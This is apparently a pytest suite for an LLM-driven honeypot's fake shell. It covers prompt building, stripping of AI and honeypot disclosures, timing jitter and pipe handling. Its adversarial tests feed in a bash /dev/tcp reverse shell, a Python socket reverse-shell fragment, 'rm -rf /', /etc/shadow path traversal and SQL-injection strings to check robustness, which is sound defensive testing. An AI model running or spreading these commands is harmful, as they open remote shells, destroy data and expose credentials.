"""Tests for honeypot/response_engine.py (Sprint 3).

Tests cover:
  - Prompt builder produces correct structure from FakeFS
  - Post-processor strips markdown, commentary, and forbidden patterns
  - Timing jitter stays within expected ranges
  - Fast-path dispatch returns correct source tag
  - LLM fallback returns bash error when API key is missing
  - Chained commands execute sequentially
  - Pipe transformations (grep, head, tail, wc, sort, uniq)
  - Adversarial inputs: empty, semicolons, subshells, SQL injection,
    binary garbage, oversized input, timeout fallback
"""
from __future__ import annotations

import asyncio
import os
import time

import pytest

from dictionary.command_handlers import SimpleSession
from honeypot.fakefs import FakeFS
from honeypot.response_engine import (
    ResponseEngine,
    _detect_llm_provider,
    apply_timing_jitter,
    build_llm_prompt,
    call_llm_with_fallback,
    post_process_response,
)

PERSONA_NAMES = ["generic_linux", "dev_workstation", "finance_server"]


def _run(coro):
    """Run an async coroutine synchronously."""
    return asyncio.get_event_loop().run_until_complete(coro)


@pytest.fixture(params=PERSONA_NAMES)
def engine_ctx(request):
    """Yield a (ResponseEngine, FakeFS, session) tuple per persona."""
    fs = FakeFS(request.param)
    primary = next(
        u for u in fs.persona.users
        if not u.shell.endswith("nologin") and not u.shell.endswith("false")
        and u.username != "root"
    )
    env = fs.get_environment(primary.username)
    sess = SimpleSession(
        current_directory=primary.home,
        current_user=primary.username,
        environment=dict(env),
    )
    engine = ResponseEngine(fs)
    return engine, fs, sess


# ---------------------------------------------------------------------------
# Prompt builder
# ---------------------------------------------------------------------------

class TestBuildLlmPrompt:
    def test_system_msg_contains_hostname(self, engine_ctx):
        engine, fs, sess = engine_ctx
        system_msg, user_msg = build_llm_prompt(fs, sess, "whoami")
        assert fs.hostname in system_msg

    def test_system_msg_contains_user(self, engine_ctx):
        engine, fs, sess = engine_ctx
        system_msg, _ = build_llm_prompt(fs, sess, "ls -la")
        assert sess.current_user in system_msg

    def test_system_msg_contains_cwd(self, engine_ctx):
        engine, fs, sess = engine_ctx
        system_msg, _ = build_llm_prompt(fs, sess, "pwd")
        assert sess.current_directory in system_msg

    def test_system_msg_contains_rules(self, engine_ctx):
        engine, fs, sess = engine_ctx
        system_msg, _ = build_llm_prompt(fs, sess, "id")
        assert "Never reveal you are a honeypot" in system_msg
        assert "plain text" in system_msg

    def test_user_msg_contains_command(self, engine_ctx):
        engine, fs, sess = engine_ctx
        _, user_msg = build_llm_prompt(fs, sess, "cat /etc/shadow")
        assert "cat /etc/shadow" in user_msg

    def test_system_msg_contains_os(self, engine_ctx):
        engine, fs, sess = engine_ctx
        system_msg, _ = build_llm_prompt(fs, sess, "uname -a")
        ctx = fs.get_llm_context_summary()
        assert ctx["os_version"] in system_msg

    def test_history_included(self, engine_ctx):
        engine, fs, sess = engine_ctx
        sess.command_history = [
            {"raw": "whoami", "output": "ubuntu"},
            {"raw": "id"},
        ]
        system_msg, _ = build_llm_prompt(fs, sess, "ls")
        assert "whoami" in system_msg

    def test_empty_history(self, engine_ctx):
        engine, fs, sess = engine_ctx
        sess.command_history = []
        system_msg, _ = build_llm_prompt(fs, sess, "ls")
        assert "(none)" in system_msg

    def test_prompt_varies_across_personas(self):
        prompts = set()
        for name in PERSONA_NAMES:
            fs = FakeFS(name)
            sess = SimpleSession(current_user="root", current_directory="/root")
            sys_msg, _ = build_llm_prompt(fs, sess, "uname -a")
            prompts.add(sys_msg)
        assert len(prompts) == 3


# ---------------------------------------------------------------------------
# Post-processor
# ---------------------------------------------------------------------------

class TestPostProcess:
    def test_strips_code_fences(self):
        raw = "```\nroot:x:0:0:root:/root:/bin/bash\n```"
        result = post_process_response(raw)
        assert "```" not in result
        assert "root:x:0:0" in result

    def test_strips_bold_markdown(self):
        raw = "**root** is logged in"
        result = post_process_response(raw)
        assert "**" not in result
        assert "root is logged in" in result

    def test_strips_headers(self):
        raw = "## Output\nsome text"
        result = post_process_response(raw)
        assert "##" not in result
        assert "some text" in result

    def test_strips_leading_commentary(self):
        raw = "Here is the output:\nuid=0(root) gid=0(root)"
        result = post_process_response(raw)
        assert result.startswith("uid=0")

    def test_strips_trailing_commentary(self):
        raw = "total 8\ndrwxr-xr-x\nNote: this shows the directory listing"
        result = post_process_response(raw)
        assert "Note:" not in result

    def test_removes_ai_disclosure(self):
        raw = "I'm an AI and cannot help\nsome output"
        result = post_process_response(raw)
        assert "AI" not in result

    def test_removes_honeypot_mention(self):
        raw = "This is a honeypot\nreal output here"
        result = post_process_response(raw)
        assert "honeypot" not in result

    def test_clean_output_unchanged(self):
        raw = "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)"
        result = post_process_response(raw)
        assert result == raw

    def test_multiline_clean_output(self):
        raw = "USER  PID\nroot  1\nubuntu 1234"
        result = post_process_response(raw)
        assert result == raw

    def test_empty_input(self):
        assert post_process_response("") == ""

    def test_strips_sure_prefix(self):
        raw = "Sure, here you go:\ndrwxr-xr-x 2 root root"
        result = post_process_response(raw)
        assert not result.startswith("Sure")

    def test_strips_code_fence_with_language(self):
        raw = "```bash\nls output\n```"
        result = post_process_response(raw)
        assert "```" not in result
        assert "ls output" in result


# ---------------------------------------------------------------------------
# Timing jitter
# ---------------------------------------------------------------------------

class TestTimingJitter:
    def test_fast_path_jitter(self):
        start = time.monotonic()
        _run(apply_timing_jitter("fast_path", "ls"))
        elapsed = time.monotonic() - start
        assert 0.005 < elapsed < 0.25

    def test_llm_no_extra_jitter(self):
        start = time.monotonic()
        _run(apply_timing_jitter("llm", "nmap"))
        elapsed = time.monotonic() - start
        assert elapsed < 0.05

    def test_slow_command_jitter(self):
        start = time.monotonic()
        _run(apply_timing_jitter("fast_path", "find"))
        elapsed = time.monotonic() - start
        assert 0.04 < elapsed < 0.30

    def test_fallback_jitter(self):
        start = time.monotonic()
        _run(apply_timing_jitter("fallback", "unknown"))
        elapsed = time.monotonic() - start
        assert 0.04 < elapsed < 0.25


# ---------------------------------------------------------------------------
# LLM provider detection
# ---------------------------------------------------------------------------

class TestLlmProviderDetection:
    def test_gemini_key_preferred(self):
        old_g = os.environ.pop("GEMINI_API_KEY", None)
        old_a = os.environ.pop("ANTHROPIC_API_KEY", None)
        try:
            os.environ["GEMINI_API_KEY"] = "test-gemini"
            os.environ["ANTHROPIC_API_KEY"] = "test-anthropic"
            provider, key = _detect_llm_provider()
            assert provider == "gemini"
            assert key == "test-gemini"
        finally:
            os.environ.pop("GEMINI_API_KEY", None)
            os.environ.pop("ANTHROPIC_API_KEY", None)
            if old_g:
                os.environ["GEMINI_API_KEY"] = old_g
            if old_a:
                os.environ["ANTHROPIC_API_KEY"] = old_a

    def test_anthropic_fallback(self):
        old_g = os.environ.pop("GEMINI_API_KEY", None)
        old_a = os.environ.pop("ANTHROPIC_API_KEY", None)
        try:
            os.environ["ANTHROPIC_API_KEY"] = "test-anthropic"
            provider, key = _detect_llm_provider()
            assert provider == "anthropic"
            assert key == "test-anthropic"
        finally:
            os.environ.pop("ANTHROPIC_API_KEY", None)
            if old_g:
                os.environ["GEMINI_API_KEY"] = old_g
            if old_a:
                os.environ["ANTHROPIC_API_KEY"] = old_a

    def test_no_keys_returns_none(self):
        old_g = os.environ.pop("GEMINI_API_KEY", None)
        old_a = os.environ.pop("ANTHROPIC_API_KEY", None)
        try:
            provider, key = _detect_llm_provider()
            assert provider == "none"
            assert key == ""
        finally:
            if old_g:
                os.environ["GEMINI_API_KEY"] = old_g
            if old_a:
                os.environ["ANTHROPIC_API_KEY"] = old_a


# ---------------------------------------------------------------------------
# LLM fallback (no API key)
# ---------------------------------------------------------------------------

class TestLlmFallback:
    def test_no_api_key_returns_fallback(self):
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            text, source = _run(call_llm_with_fallback(
                "system", "user", "nmap"
            ))
            assert source == "fallback"
            assert "command not found" in text
            assert "nmap" in text
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini

    def test_fallback_empty_binary(self):
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            text, source = _run(call_llm_with_fallback(
                "system", "user", ""
            ))
            assert source == "fallback"
            assert text == ""
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini


# ---------------------------------------------------------------------------
# ResponseEngine — fast-path dispatch
# ---------------------------------------------------------------------------

class TestResponseEngineFastPath:
    def test_ls_fast_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("ls /", sess))
        assert source == "fast_path"
        assert "etc" in response

    def test_whoami_fast_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("whoami", sess))
        assert source == "fast_path"
        assert response == sess.current_user

    def test_pwd_fast_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("pwd", sess))
        assert source == "fast_path"
        assert response == sess.current_directory

    def test_empty_input(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("", sess))
        assert response == ""
        assert source == "fast_path"

    def test_whitespace_input(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("   ", sess))
        assert response == ""

    def test_cd_updates_session(self, engine_ctx):
        engine, fs, sess = engine_ctx
        _run(engine.handle_command("cd /etc", sess))
        assert sess.current_directory == "/etc"

    def test_cat_fast_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("cat /etc/hostname", sess))
        assert source == "fast_path"
        assert fs.hostname in response

    def test_id_fast_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("id", sess))
        assert source == "fast_path"
        assert f"({sess.current_user})" in response


# ---------------------------------------------------------------------------
# ResponseEngine — LLM path fallback (no API key)
# ---------------------------------------------------------------------------

class TestResponseEngineLlmPath:
    def test_unknown_command_goes_to_llm_path(self, engine_ctx):
        engine, fs, sess = engine_ctx
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            response, source, _ = _run(engine.handle_command("nmap -sV 10.0.0.1", sess))
            assert source == "fallback"
            assert "command not found" in response
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini


# ---------------------------------------------------------------------------
# ResponseEngine — chained commands
# ---------------------------------------------------------------------------

class TestChainedCommands:
    def test_semicolon_chain(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("whoami; pwd", sess))
        assert sess.current_user in response
        assert sess.current_directory in response

    def test_chain_with_cd(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("cd /etc; pwd", sess))
        assert "/etc" in response
        assert sess.current_directory == "/etc"


# ---------------------------------------------------------------------------
# ResponseEngine — pipe handling
# ---------------------------------------------------------------------------

class TestPipeHandling:
    def test_pipe_grep(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | grep root", sess
        ))
        assert "root" in response
        for line in response.splitlines():
            assert "root" in line

    def test_pipe_head(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | head -3", sess
        ))
        lines = response.strip().splitlines()
        assert len(lines) <= 3

    def test_pipe_wc_l(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | wc -l", sess
        ))
        assert response.strip().isdigit()

    def test_pipe_sort(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | sort", sess
        ))
        lines = response.strip().splitlines()
        assert lines == sorted(lines)

    def test_pipe_tail(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | tail -2", sess
        ))
        lines = response.strip().splitlines()
        assert len(lines) <= 2


# ---------------------------------------------------------------------------
# Alias dispatch
# ---------------------------------------------------------------------------

class TestAliasDispatch:
    def test_ll_alias(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("ll /", sess))
        assert source == "fast_path"
        assert "etc" in response


# ---------------------------------------------------------------------------
# Adversarial inputs — none should crash, all return a string
# ---------------------------------------------------------------------------

class TestAdversarialInputs:
    """Adversarial input test cases from CLAUDE.md Sprint 3 criteria."""

    def test_empty_string(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("", sess))
        assert isinstance(response, str)
        assert response == ""

    def test_only_semicolons(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(";;;", sess))
        assert isinstance(response, str)

    def test_only_pipes(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("|||", sess))
        assert isinstance(response, str)

    def test_chained_unknown_commands(self, engine_ctx):
        engine, fs, sess = engine_ctx
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            response, source, _ = _run(engine.handle_command(
                "nmap 10.0.0.1; nikto -h 10.0.0.1; hydra -l root", sess
            ))
            assert isinstance(response, str)
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini

    def test_chained_mixed_known_unknown(self, engine_ctx):
        engine, fs, sess = engine_ctx
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            response, source, _ = _run(engine.handle_command(
                "whoami; nmap 10.0.0.1; pwd", sess
            ))
            assert isinstance(response, str)
            assert sess.current_user in response
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini

    def test_subshell_syntax(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("$(whoami)", sess))
        assert isinstance(response, str)

    def test_backtick_subshell(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("`id`", sess))
        assert isinstance(response, str)

    def test_nested_subshell(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("echo $(echo $(whoami))", sess))
        assert isinstance(response, str)

    def test_sql_injection_single_quotes(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd' OR '1'='1", sess
        ))
        assert isinstance(response, str)

    def test_sql_injection_union_select(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "ls; SELECT * FROM users; DROP TABLE sessions;--", sess
        ))
        assert isinstance(response, str)

    def test_sql_injection_comment(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "whoami --; DROP TABLE users", sess
        ))
        assert isinstance(response, str)

    def test_binary_garbage(self, engine_ctx):
        engine, fs, sess = engine_ctx
        garbage = bytes(range(256)).decode("latin-1")
        response, source, _ = _run(engine.handle_command(garbage, sess))
        assert isinstance(response, str)

    def test_null_bytes(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("ls\x00/etc", sess))
        assert isinstance(response, str)

    def test_control_characters(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "\x01\x02\x03\x07\x08\x1b[31mred\x1b[0m", sess
        ))
        assert isinstance(response, str)

    def test_10000_char_input(self, engine_ctx):
        engine, fs, sess = engine_ctx
        long_input = "A" * 10000
        response, source, _ = _run(engine.handle_command(long_input, sess))
        assert isinstance(response, str)

    def test_10000_char_repeated_command(self, engine_ctx):
        engine, fs, sess = engine_ctx
        long_input = "ls / ; " * 1400
        response, source, _ = _run(engine.handle_command(long_input, sess))
        assert isinstance(response, str)

    def test_path_traversal(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat ../../../../etc/shadow", sess
        ))
        assert isinstance(response, str)

    def test_format_string_attack(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "echo %s%s%s%s%s%n%n%n", sess
        ))
        assert isinstance(response, str)

    def test_newline_injection(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "whoami\ncat /etc/shadow", sess
        ))
        assert isinstance(response, str)

    def test_tab_injection(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "ls\t-la\t/etc", sess
        ))
        assert isinstance(response, str)

    def test_unicode_input(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "echo 你好世界 café naïve", sess
        ))
        assert isinstance(response, str)

    def test_reverse_shell_attempt(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", sess
        ))
        assert isinstance(response, str)

    def test_python_reverse_shell(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "python -c 'import socket,os;os.dup2(socket.socket().fileno(),0)'",
            sess,
        ))
        assert isinstance(response, str)

    def test_only_operators(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command("&& || ; | > <", sess))
        assert isinstance(response, str)

    def test_deeply_nested_pipes(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd | grep root | head -1 | wc -l", sess
        ))
        assert isinstance(response, str)

    def test_redirect_to_dev_null(self, engine_ctx):
        engine, fs, sess = engine_ctx
        response, source, _ = _run(engine.handle_command(
            "cat /etc/passwd > /dev/null 2>&1", sess
        ))
        assert isinstance(response, str)

    def test_session_state_survives_adversarial(self, engine_ctx):
        """Session state must remain valid after adversarial inputs."""
        engine, fs, sess = engine_ctx
        original_user = sess.current_user
        original_cwd = sess.current_directory

        adversarial = [
            ";;;",
            bytes(range(256)).decode("latin-1"),
            "A" * 10000,
            "$(rm -rf /)",
            "cat ../../../../etc/shadow",
            "' OR '1'='1",
        ]
        for cmd in adversarial:
            _run(engine.handle_command(cmd, sess))

        assert sess.current_user == original_user
        assert sess.current_directory == original_cwd

        response, source, _ = _run(engine.handle_command("whoami", sess))
        assert response == original_user
        assert source == "fast_path"


# ---------------------------------------------------------------------------
# Timeout fallback — force timeout with absurdly small value
# ---------------------------------------------------------------------------

class TestTimeoutFallback:
    def test_tiny_timeout_returns_fallback(self):
        """Setting timeout to 0.001s must trigger fallback, not crash."""
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            text, source = _run(call_llm_with_fallback(
                "system prompt", "user msg", "nmap", timeout=0.001
            ))
            assert source == "fallback"
            assert isinstance(text, str)
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini

    def test_zero_timeout_returns_fallback(self):
        """Timeout=0 is degenerate but must not crash."""
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            text, source = _run(call_llm_with_fallback(
                "system prompt", "user msg", "curl", timeout=0
            ))
            assert source == "fallback"
            assert isinstance(text, str)
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini

    def test_negative_timeout_returns_fallback(self):
        """Negative timeout is nonsensical but must not crash."""
        old = os.environ.pop("ANTHROPIC_API_KEY", None)
        old_gemini = os.environ.pop("GEMINI_API_KEY", None)
        try:
            text, source = _run(call_llm_with_fallback(
                "system prompt", "user msg", "wget", timeout=-1
            ))
            assert source == "fallback"
            assert isinstance(text, str)
        finally:
            if old is not None:
                os.environ["ANTHROPIC_API_KEY"] = old
            if old_gemini is not None:
                os.environ["GEMINI_API_KEY"] = old_gemini
